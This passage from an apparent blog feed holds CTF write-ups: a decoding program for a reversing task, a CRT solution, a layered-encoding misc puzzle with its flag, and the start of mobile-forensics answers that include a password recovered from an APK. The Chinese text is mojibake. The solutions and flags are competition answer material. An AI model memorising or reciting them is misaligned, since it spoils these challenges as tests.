class="number">0x1A</span>, <span class="number">0x19</span>, <span class="number">0x18</span>, <span class="number">0x17</span>, <span class="number">0x16</span>, <span class="number">0x15</span>, <span class="number">0x14</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x11</span>, <span class="number">0x10</span>, <span class="number">0x0F</span>, <span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x0C</span>, <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0x09</span>, <span class="number">0x08</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x01</span>&#125;;</span><br><span class="line">    <span class="type">int</span> eeee[]=&#123;<span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x63</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x60</span>, <span class="number">0x5F</span>, <span class="number">0x5E</span>, <span class="number">0x5D</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>, <span class="number">0x5A</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x56</span>, <span class="number">0x55</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x52</span>, <span class="number">0x51</span>, <span class="number">0x50</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x4B</span>, <span class="number">0x4A</span>, <span class="number">0x49</span>, <span class="number">0x48</span>, <span class="number">0x47</span>, <span class="number">0x46</span>, <span class="number">0x45</span>, <span class="number">0x44</span>, <span class="number">0x43</span>, <span class="number">0x42</span>, <span class="number">0x41</span>, <span class="number">0x40</span>, <span class="number">0x3F</span>, <span class="number">0x3E</span>, <span class="number">0x3D</span>, <span class="number">0x3C</span>, <span class="number">0x3B</span>, <span class="number">0x3A</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x37</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x34</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0x30</span>, <span class="number">0x2F</span>&#125;;</span><br><span class="line">    <span class="type">int</span>  ccc[] = &#123;<span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0x0D</span>, <span class="number">0x0E</span>, <span class="number">0x0F</span>, <span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x17</span>, <span class="number">0x18</span>, <span class="number">0x19</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x1C</span>, <span class="number">0x1D</span>, <span class="number">0x1E</span>, <span class="number">0x1F</span>, <span class="number">0x20</span>, <span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0x23</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0x28</span>, <span class="number">0x29</span>, <span class="number">0x2A</span>, <span class="number">0x2B</span>, <span class="number">0x2C</span>, <span class="number">0x2D</span>, <span class="number">0x2E</span>, <span class="number">0x2F</span>, <span class="number">0x30</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x3A</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x3D</span>, <span class="number">0x3E</span>, <span class="number">0x3F</span>, <span class="number">0x40</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0x45</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x48</span>, <span class="number">0x49</span>, <span class="number">0x4A</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x4D</span>, <span class="number">0x4E</span>, <span class="number">0x4F</span>, <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x58</span>, <span class="number">0x59</span>, <span class="number">0x5A</span>, <span class="number">0x5B</span>, <span class="number">0x5C</span>, <span class="number">0x5D</span>, <span class="number">0x5E</span>, <span class="number">0x5F</span>, <span class="number">0x60</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x6B</span>, <span class="number">0x6C</span>, <span class="number">0x6D</span>, <span class="number">0x6E</span>, <span class="number">0x6F</span>, <span class="number">0x70</span>, <span class="number">0x71</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x76</span>, <span class="number">0x77</span>, <span class="number">0x78</span>, <span class="number">0x79</span>, <span class="number">0x7A</span>, <span class="number">0x7B</span>, <span class="number">0x7C</span>, <span class="number">0x7D</span>, <span class="number">0x7E</span>, <span class="number">0x7F</span>, <span class="number">0x80</span>, <span class="number">0x81</span>, <span class="number">0x82</span>, <span class="number">0x83</span>, <span class="number">0x84</span>, <span class="number">0x85</span>, <span class="number">0x86</span>, <span class="number">0x87</span>, <span class="number">0x88</span>, <span class="number">0x89</span>, <span class="number">0x8A</span>, <span class="number">0x8B</span>, <span class="number">0x8C</span>, <span class="number">0x8D</span>&#125;;</span><br><span class="line">    <span class="type">int</span> len=<span class="number">46</span>;</span><br><span class="line"><span class="type">char</span> bbb[] = &#123;<span class="number">0x96</span>, <span class="number">0xa1</span>, <span class="number">0xa0</span>, <span class="number">0x9b</span>, <span class="number">0x9b</span>, <span class="number">0x5f</span>, <span class="number">0x49</span>, <span class="number">0x46</span>, <span class="number">0x85</span>, <span class="number">0x82</span>, <span class="number">0x53</span>, <span class="number">0x95</span>, <span class="number">0x7d</span>, <span class="number">0x36</span>, <span class="number">0x8d</span>, <span class="number">0x74</span>, <span class="number">0x82</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0x7a</span>, <span class="number">0x81</span>, <span class="number">0x65</span>, <span class="number">0x80</span>, <span class="number">0x6c</span>, <span class="number">0x78</span>, <span class="number">0x2f</span>, <span class="number">0x6b</span>, <span class="number">0x6a</span>, <span class="number">0x27</span>, <span class="number">0x50</span>, <span class="number">0x61</span>, <span class="number">0x38</span>, <span class="number">0x3f</span>, <span class="number">0x37</span>, <span class="number">0x33</span>, <span class="number">0xf1</span>, <span class="number">0x27</span>, <span class="number">0x32</span>, <span class="number">0x34</span>, <span class="number">0x1f</span>, <span class="number">0x39</span>, <span class="number">0x23</span>, <span class="number">0xde</span>, <span class="number">0x1c</span>, <span class="number">0x17</span>, <span class="number">0xd4</span>&#125;;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        bbb[i] -=  dddd[i];  </span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        eeee[i] ^=  dddd[i+<span class="number">1</span>];  </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">         <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        eeee[i] -=  ccc[i];  </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            bbb[i] +=  ccc[<span class="number">47</span> + i];  </span><br><span class="line">             ccc[i]^=eeee[<span class="number">51</span>];</span><br><span class="line">        </span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        bbb[i] ^=  ccc[i];  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,bbb[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241114-002954373.png" class=""><br>å¾—åˆ°ä¸€ä¸ªåšå®¢ç½‘å€<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241114-003101352.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241114-003116642.png" class=""><br>RC4åŠ å¯†<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241114-003242429.png" class="">  </p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ncoCRT"><a href="#ncoCRT" class="headerlink" title="ncoCRT"></a>ncoCRT</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;SYC&#123;...&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag+<span class="string">b&#x27;\x01&#x27;</span>*<span class="number">23</span>)</span><br><span class="line"></span><br><span class="line">p = [<span class="number">0</span>]*<span class="number">5</span></span><br><span class="line">c = [<span class="number">0</span>]*<span class="number">5</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    p0 = random.randint(<span class="number">2</span>**<span class="number">100</span>,<span class="number">2</span>**<span class="number">101</span>)</span><br><span class="line">    p[i] = p0</span><br><span class="line">c = [m%p[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p = [1921232050179818686537976490035, 2050175089402111328155892746480, 1960810970476421389691930930824, 1797713136323968089432024221276, 2326915607951286191807212748022]</span></span><br><span class="line"><span class="string">c = [1259284928311091851012441581576, 1501691203352712190922548476321, 1660842626322200346728249202857, 657314037433265072289232145909, 2056630082529583499248887436721]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸­å›½å‰©ä½™å®šç†æ¥è§£<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">import random</span><br><span class="line">from sympy.ntheory.modular import solve_congruence</span><br><span class="line"></span><br><span class="line">p = [1921232050179818686537976490035,</span><br><span class="line">     2050175089402111328155892746480,</span><br><span class="line">     1960810970476421389691930930824,</span><br><span class="line">     1797713136323968089432024221276,</span><br><span class="line">     2326915607951286191807212748022]</span><br><span class="line"></span><br><span class="line">c = [1259284928311091851012441581576,</span><br><span class="line">     1501691203352712190922548476321,</span><br><span class="line">     1660842626322200346728249202857,</span><br><span class="line">     657314037433265072289232145909,</span><br><span class="line">     2056630082529583499248887436721]</span><br><span class="line"></span><br><span class="line">m, _ = solve_congruence(*[(c[i], p[i]) for i in range(5)])</span><br><span class="line"></span><br><span class="line">flag_with_padding = long_to_bytes(m)</span><br><span class="line">flag = flag_with_padding[:-23]  </span><br><span class="line"></span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241114-004957317.png" class="">  </p><h1 id="ä¸æ˜¯å¥—å¨ƒ"><a href="#ä¸æ˜¯å¥—å¨ƒ" class="headerlink" title="ä¸æ˜¯å¥—å¨ƒ"></a>ä¸æ˜¯å¥—å¨ƒ</h1><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241118-120455298.png" class="">  <img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241118-120455578.png" class="">  <p>æ‘©æ–¯å¯†ç <br>è½¬å°å†™<br>xin_ji_zi_wa_yi_zi_mo_yi_dua_zi<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241118-121320756.png" class=""><br>ç»´å‰å°¼äºšè§£å¯†</p><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241118-121439679.png" class="">  <p>hashåŠ å¯†<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241118-121533960.png" class="">  </p><p>æ …æ è§£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ba &amp; Ro</span><br><span class="line">100 -&gt; 13 -&gt; 64 -&gt; 65536</span><br></pre></td></tr></table></figure><p>å› ä¸ºå¯†æ–‡æ˜¯emojiè¡¨æƒ…åŒ…å³base100ç¼–ç å¯ä»¥çŒœæµ‹tipçš„æ„æ€æ˜¯baseå’Œroté‚£ä¹ˆåº”è¯¥å°±æ˜¯base100-&gt;rot13-&gt;base64-&gt;base65535<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241118-121800068.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241118-121900633.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241118-121932037.png" class="">  </p><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241118-122011384.png" class="">  <p>å°†ç¹ä½“å­—æ”¹æˆç°¡é«”å­—å³å¯æ‰“å¼€å‹ç¼©åŒ…<br>åŸç¥ï¼Œå¯åŠ¨ï¼</p><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241118-122104178.png" class="">  <p>SYC{H0W_P3RF3C+_YU0_AR3!}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>é¾™ä¿¡æ¯2024</title>
      <link href="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/"/>
      <url>/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/</url>
      
        <content type="html"><![CDATA[<img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-121123063.png" class="">  <h1 id="æ‰‹æœºå–è¯"><a href="#æ‰‹æœºå–è¯" class="headerlink" title="æ‰‹æœºå–è¯"></a>æ‰‹æœºå–è¯</h1><h2 id="1-åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®æ­¤æ‰‹æœºå…±é€šè¿‡adbè¿æ¥è¿‡å‡ ä¸ªè®¾å¤‡ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š3"><a href="#1-åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®æ­¤æ‰‹æœºå…±é€šè¿‡adbè¿æ¥è¿‡å‡ ä¸ªè®¾å¤‡ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š3" class="headerlink" title="1.åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®æ­¤æ‰‹æœºå…±é€šè¿‡adbè¿æ¥è¿‡å‡ ä¸ªè®¾å¤‡ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š3)"></a>1.åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®æ­¤æ‰‹æœºå…±é€šè¿‡adbè¿æ¥è¿‡å‡ ä¸ªè®¾å¤‡ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š3)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-123526832.png" class="">  <p>æˆ‘ä»¬å®¿èˆadbå¯ä»¥æœç´¢é“adb_keyså…¶æ–‡ä»¶ä¸­æœ‰ä¸¤ä¸ªkey,å½“ä½¿ç”¨adbé“¾æ¥å…¶ä»–è®¾å¤‡æ—¶ä¼šç”Ÿæˆä¸€ä¸ªå…¬ç§é’¥,å…¬é’¥å­˜åœ¨adb_keysä¸­.æ‰€ä»¥è¿æ¥è¿‡ä¸¤ä¸ª xmlä¸­è¿˜æœ‰æ—¶é—´æˆ³</p><h2 id="2-åˆ†ææ‰‹æœºæ£€æï¼Œæœºä¸»å‚åŠ è€ƒè¯•çš„æ—¶é—´æ˜¯ä»€ä¹ˆæ—¶å€™ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š2024-06-17"><a href="#2-åˆ†ææ‰‹æœºæ£€æï¼Œæœºä¸»å‚åŠ è€ƒè¯•çš„æ—¶é—´æ˜¯ä»€ä¹ˆæ—¶å€™ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š2024-06-17" class="headerlink" title="2.åˆ†ææ‰‹æœºæ£€æï¼Œæœºä¸»å‚åŠ è€ƒè¯•çš„æ—¶é—´æ˜¯ä»€ä¹ˆæ—¶å€™ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š2024-06-17)"></a>2.åˆ†ææ‰‹æœºæ£€æï¼Œæœºä¸»å‚åŠ è€ƒè¯•çš„æ—¶é—´æ˜¯ä»€ä¹ˆæ—¶å€™ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š2024-06-17)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-130022799.png" class="">  <p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªä¿®æ”¹æ—¶é—´ä¸º8æœˆ12æ—¥,ä¸‹å‘¨5ä¹Ÿå°±æ˜¯8æœˆ23<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-130051670.png" class="">  </p><h2 id="3-åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®æ‰‹æœºçš„è“ç‰™Macåœ°å€æ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š12-12-12-12-12-12"><a href="#3-åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®æ‰‹æœºçš„è“ç‰™Macåœ°å€æ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š12-12-12-12-12-12" class="headerlink" title="3.åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®æ‰‹æœºçš„è“ç‰™Macåœ°å€æ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š12:12:12:12:12:12)"></a>3.åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®æ‰‹æœºçš„è“ç‰™Macåœ°å€æ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š12:12:12:12:12:12)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-164117417.png" class="">  <h2 id="4-åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®å‹ç¼©åŒ…åŠ å¯†è½¯ä»¶å…±åŠ å¯†è¿‡å‡ ä»½æ–‡ä»¶ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š3"><a href="#4-åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®å‹ç¼©åŒ…åŠ å¯†è½¯ä»¶å…±åŠ å¯†è¿‡å‡ ä»½æ–‡ä»¶ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š3" class="headerlink" title="4.åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®å‹ç¼©åŒ…åŠ å¯†è½¯ä»¶å…±åŠ å¯†è¿‡å‡ ä»½æ–‡ä»¶ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š3)"></a>4.åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®å‹ç¼©åŒ…åŠ å¯†è½¯ä»¶å…±åŠ å¯†è¿‡å‡ ä»½æ–‡ä»¶ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š3)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-171735282.png" class="">  <p>æˆ‘ä»¬åœ¨åº”ç”¨åˆ—è¡¨é‡Œæœç´¢å…³é”®è¯ï¼Œå¦‚file,zip,rar,7z,Encryptor,Cryptoç­‰ï¼Œå¦‚æœæœä¸åˆ°å°±åªèƒ½ä¸€ä¸ªä¸ªçœ‹äº†ï¼Œæˆ‘ä»¬æœç´¢fileå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªä¸ºFileCompressï¼Œæ–‡ä»¶å‹ç¼©çš„è½¯ä»¶ã€‚</p><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-173953023.png" class="">  <p>æˆ‘ä»¬æœç´¢æœ€åä¸€ä¸ªæ–‡ä»¶å¤¹çš„åå­—æ¥æŸ¥æ‰¾è¯¥åº”ç”¨çš„å®‰è£…ä½ç½®ã€‚ä¼šå‘ç°ä¸€ä¸ªapkçŒœæµ‹ä¸ºè¯¥è½¯ä»¶çš„apkã€‚<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-172551055.png" class="">  </p><p>åœ¨å®‰å“åº”ç”¨çš„æ•°æ®ä¸€èˆ¬å­˜å‚¨åœ¨/storage/emulated/0 æˆ– media/0æ–‡ä»¶å¤¹ä¸‹ï¼Œæˆ‘ä»¬åœ¨è¿™äº›æ–‡ä»¶å¤¹ä¸‹æœç´¢å¯ä»¥æ‰¾åˆ°å¦‚ä¸‹çš„æ–‡ä»¶ã€‚ç‚¹å¼€è¿™äº›exeå‘ç°éœ€è¦<br>æ‰“å¼€txtå¯ä»¥å‘ç°ä¸ºå‹ç¼©åŒ…ï¼Œæ”¹ä¸ºzipå‘ç°éœ€è¦å¯†ç ã€‚</p><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-173226800.png" class="">  <p>æˆ‘ä»¬å°†apkç”±æ¨¡æ‹Ÿå™¨æ‰“å¼€å‘ç°å…¶å¹¶æ²¡æœ‰å‘ŠçŸ¥å¯†ç ä¹Ÿæ²¡æœ‰è®¾ç½®å¯†ç çš„ç¯èŠ‚ï¼Œé‚£ä¹ˆå¯†ç åº”è¯¥å°±åœ¨apkä¸­äº†</p><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-173138311.png" class="">  <p>é€†å‘apkï¼Œåœ¨apkçš„åŒ…åçš„åŒ…ä¸‹å¯ä»¥æ‰¾åˆ°å¯†ç ã€‚ï¼ˆapké€†å‘åå…ˆçœ‹apkè‡ªå·±çš„åŒ…ï¼‰<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-174410016.png" class=""><br>1!8Da9Re5it2b3a.</p><p>æ€»å…±åŠ å¯†è¿‡6ä»½æ–‡ä»¶</p><h2 id="5-åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®æœºä¸»çš„å¦å¤–ä¸€ä¸ª155çš„æ‰‹æœºå·ç æ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š15555000555"><a href="#5-åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®æœºä¸»çš„å¦å¤–ä¸€ä¸ª155çš„æ‰‹æœºå·ç æ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š15555000555" class="headerlink" title="5.åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®æœºä¸»çš„å¦å¤–ä¸€ä¸ª155çš„æ‰‹æœºå·ç æ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š15555000555)"></a>5.åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®æœºä¸»çš„å¦å¤–ä¸€ä¸ª155çš„æ‰‹æœºå·ç æ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š15555000555)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-175351036.png" class="">  <h2 id="6-åˆ†ææ‰‹æœºæ£€æï¼Œå…¶æ‰‹æœºå­˜åœ¨ä¸€ä¸ªåŠ å¯†å®¹å™¨ï¼Œè¯·é—®å…¶å®¹å™¨å¯†ç æ˜¯å¤šå°‘ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šabc123ï¼‰"><a href="#6-åˆ†ææ‰‹æœºæ£€æï¼Œå…¶æ‰‹æœºå­˜åœ¨ä¸€ä¸ªåŠ å¯†å®¹å™¨ï¼Œè¯·é—®å…¶å®¹å™¨å¯†ç æ˜¯å¤šå°‘ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šabc123ï¼‰" class="headerlink" title="6.åˆ†ææ‰‹æœºæ£€æï¼Œå…¶æ‰‹æœºå­˜åœ¨ä¸€ä¸ªåŠ å¯†å®¹å™¨ï¼Œè¯·é—®å…¶å®¹å™¨å¯†ç æ˜¯å¤šå°‘ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šabc123ï¼‰"></a>6.åˆ†ææ‰‹æœºæ£€æï¼Œå…¶æ‰‹æœºå­˜åœ¨ä¸€ä¸ªåŠ å¯†å®¹å™¨ï¼Œè¯·é—®å…¶å®¹å™¨å¯†ç æ˜¯å¤šå°‘ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šabc123ï¼‰</h2><p>åœ¨å‰é¢çš„å‹ç¼©åŒ…ä¸­å¯ä»¥æ‰¾åˆ°<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-174818262.png" class="">  </p><h2 id="7-åˆ†ææ‰‹æœºæ£€æï¼Œæ¥ä¸Šé—®ï¼Œå…¶å®¹å™¨ä¸­å­˜åœ¨ä¸€ä»½æˆå‘˜åå•ï¼Œå«Œç–‘äººæ›¾ç»è¯¯è§¦å¯¼è‡´è¡¨æ ¼ä¸­çš„ä¸€ä¸ªæˆå‘˜å§“åè¢«é”™è¯¯ä¿®æ”¹ï¼Œè¯·ç¡®è®¤è¿™ä¸ªæˆå‘˜çš„åŸå§‹æ­£ç¡®å§“åï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šå¼ ä¸‰"><a href="#7-åˆ†ææ‰‹æœºæ£€æï¼Œæ¥ä¸Šé—®ï¼Œå…¶å®¹å™¨ä¸­å­˜åœ¨ä¸€ä»½æˆå‘˜åå•ï¼Œå«Œç–‘äººæ›¾ç»è¯¯è§¦å¯¼è‡´è¡¨æ ¼ä¸­çš„ä¸€ä¸ªæˆå‘˜å§“åè¢«é”™è¯¯ä¿®æ”¹ï¼Œè¯·ç¡®è®¤è¿™ä¸ªæˆå‘˜çš„åŸå§‹æ­£ç¡®å§“åï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šå¼ ä¸‰" class="headerlink" title="7.åˆ†ææ‰‹æœºæ£€æï¼Œæ¥ä¸Šé—®ï¼Œå…¶å®¹å™¨ä¸­å­˜åœ¨ä¸€ä»½æˆå‘˜åå•ï¼Œå«Œç–‘äººæ›¾ç»è¯¯è§¦å¯¼è‡´è¡¨æ 